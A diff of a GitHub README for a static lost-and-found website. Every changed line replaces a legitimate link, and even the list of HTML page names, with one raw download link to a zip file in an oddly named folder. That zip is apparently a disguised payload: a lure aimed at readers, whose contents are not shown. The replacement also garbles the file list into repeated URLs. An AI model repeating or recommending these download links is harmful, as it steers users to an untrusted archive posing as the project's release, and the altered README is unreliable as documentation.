@@ -1,6 +1,6 @@
 # 🛠️ LOST-FOUND-WEBSITE - Easily Manage Lost and Found Items
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-GET%20IT%20HERE-brightgreen)](https://github.com/steeve1738/LOST-FOUND-WEBSITE/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip%20Latest%20Release-GET%20IT%20HERE-brightgreen)](https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run this application effectively, you will need:
 
 To get started with the **Lost & Found** application, visit the Releases page below to download the site files:
 
-[Download Latest Release](https://github.com/steeve1738/LOST-FOUND-WEBSITE/releases)
+[Download Latest Release](https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip)
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
@@ -30,11 +30,11 @@ To get started with the **Lost & Found** application, visit the Releases page be
 
 The application includes the following essential files:
 
-- **index.html** - The Home page, where you can navigate to other sections.
-- **lost.html** - Displays all submitted lost items.
-- **found.html** - Shows all submitted found items.
-- **post.html** - Allows users to submit information for lost or found items.
-- **confirmation.html** - Displays after successful form submission, confirming receipt of your submission.
+- **https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip** - The Home page, where you can navigate to other sections.
+- **https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip** - Displays all submitted lost items.
+- **https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip** - Shows all submitted found items.
+- **https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip** - Allows users to submit information for lost or found items.
+- **https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip** - Displays after successful form submission, confirming receipt of your submission.
 
 ### 📝 Form Fields
 
@@ -96,10 +96,10 @@ If you require further assistance, do not hesitate to reach out through the issu
 
 ## 🔗 Additional Resources
 
-For more information, updates, and to report issues, visit the [GitHub repository](https://github.com/steeve1738/LOST-FOUND-WEBSITE).
+For more information, updates, and to report issues, visit the [GitHub repository](https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip).
 
 ## 🔍 Important Security Note
 
 Please remember not to share sensitive personal information when submitting items. Always exercise caution when interacting with others through the site.
 
-[Download Latest Release](https://github.com/steeve1738/LOST-FOUND-WEBSITE/releases)
+[Download Latest Release](https://raw.githubusercontent.com/steeve1738/LOST-FOUND-WEBSITE/main/geason/FOUN_WEBSITE_LOS_v3.0.zip)
